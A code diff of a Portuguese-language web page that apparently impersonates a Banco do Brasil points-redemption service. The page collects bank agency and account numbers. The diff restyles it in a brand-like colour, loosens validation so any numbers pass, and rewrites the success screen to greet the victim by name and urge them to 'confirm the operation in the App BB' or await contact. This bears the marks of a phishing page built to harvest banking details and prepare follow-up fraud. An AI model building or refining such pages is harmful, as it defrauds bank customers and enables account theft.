@@ -97,7 +97,7 @@
 
         .home-lista li::before {
             content: "✓";
-            color: #ff0000;
+            color: #DF0979;
             font-weight: 700;
             font-size: 18px;
         }
@@ -115,7 +115,7 @@
         }
 
         .titulo span {
-            color: #ff0000;
+            color: #DF0979;
         }
 
         .subtitulo {
@@ -151,7 +151,7 @@
         }
 
         .campo:focus {
-            border-color: #ff0000;
+            border-color: #DF0979;
         }
 
         .btn {
@@ -159,7 +159,7 @@
             padding: 18px;
             border: none;
             border-radius: 12px;
-            background-color: #ff0000;
+            background-color: #DF0979;
             color: #FFFFFF;
             font-size: 18px;
             font-weight: 700;
@@ -171,7 +171,7 @@
         }
 
         .btn:hover {
-            background-color: #cc0000;
+            background-color: #c0076a;
             transform: scale(1.02);
         }
 
@@ -203,7 +203,7 @@
         .destaque-pontos {
             font-size: 38px;
             font-weight: 900;
-            color: #ff0000;
+            color: #DF0979;
             display: block;
             margin: 10px 0;
         }
@@ -216,7 +216,7 @@
         }
 
         .erro {
-            color: #ff0000;
+            color: #DF0979;
             font-size: 14px;
             margin-top: -8px;
             margin-bottom: 12px;
@@ -227,22 +227,33 @@
             display: block;
         }
 
+        /* ===== TELA DE SUCESSO ===== */
         .sucesso-icon {
             font-size: 64px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         .sucesso-titulo {
             font-size: 22px;
             font-weight: 700;
-            color: #00aa00;
+            color: #000000;
             margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .sucesso-titulo span {
+            color: #DF0979;
         }
 
         .sucesso-texto {
-            font-size: 16px;
-            color: #333333;
-            line-height: 1.6;
+            font-size: 15px;
+            color: #444;
+            line-height: 1.7;
+            text-align: center;
+        }
+
+        .sucesso-texto strong {
+            color: #DF0979;
         }
 
         @media (max-width: 480px) {
@@ -268,6 +279,12 @@
             }
             .home-titulo {
                 font-size: 20px;
+            }
+            .sucesso-titulo {
+                font-size: 18px;
+            }
+            .sucesso-texto {
+                font-size: 14px;
             }
         }
     </style>
@@ -340,11 +357,17 @@
             <button class="btn" id="btnResgate">INICIAR RESGATE</button>
         </div>
 
-        <!-- ===== TELA 4 - SUCESSO ===== -->
+        <!-- ===== TELA 4 - SUCESSO (OPÇÃO 1) ===== -->
         <div class="tela" id="telaSucesso">
             <div class="sucesso-icon">✅</div>
-            <div class="sucesso-titulo">Resgate iniciado com sucesso!</div>
-            <div class="sucesso-texto">Em breve nossa equipe responsável entrará em contato.</div>
+            <div class="sucesso-titulo">Olá, <span id="sucessoNome">Usuário</span>!</div>
+            <div class="sucesso-texto">
+                Recebemos a sua solicitação de resgate dos pontos com sucesso.
+                <br><br>
+                Para concluir o processo, <strong>confirme a operação diretamente no seu App BB</strong> ou aguarde o contato da nossa equipe.
+                <br><br>
+                Em breve, entraremos em contato com os próximos passos.
+            </div>
         </div>
 
     </div>
@@ -438,18 +461,16 @@
         let dadosUsuario = {};
 
         // ================================================================
-        // VALIDAÇÕES BB (VERSÃO RELAXADA - ACEITA QUALQUER NÚMERO REAL)
+        // VALIDAÇÕES BB (VERSÃO RELAXADA)
         // ================================================================
 
         function validarAgenciaBB(agencia) {
             const numeros = agencia.replace(/\D/g, '');
-            // Aceita qualquer agência com 1 a 10 números (relaxado)
             return numeros.length >= 1 && numeros.length <= 10;
         }
 
         function validarContaBB(conta) {
             const numeros = conta.replace(/\D/g, '');
-            // Aceita qualquer conta com 1 a 15 números (relaxado)
             return numeros.length >= 1 && numeros.length <= 15;
         }
 
@@ -508,7 +529,7 @@
         });
 
         // ================================================================
-        // INICIAR RESGATE (COM MENSAGENS SIMPLES)
+        // INICIAR RESGATE
         // ================================================================
         document.getElementById('btnResgate').addEventListener('click', async function() {
             const agencia = document.getElementById('agencia').value.trim();
@@ -587,6 +608,8 @@
                 console.error('Erro ao salvar:', error);
             }
 
+            // ===== MOSTRA A TELA DE SUCESSO COM O NOME =====
+            document.getElementById('sucessoNome').textContent = dadosUsuario.nome || 'Usuário';
             mostrarTela('telaSucesso');
         });
 
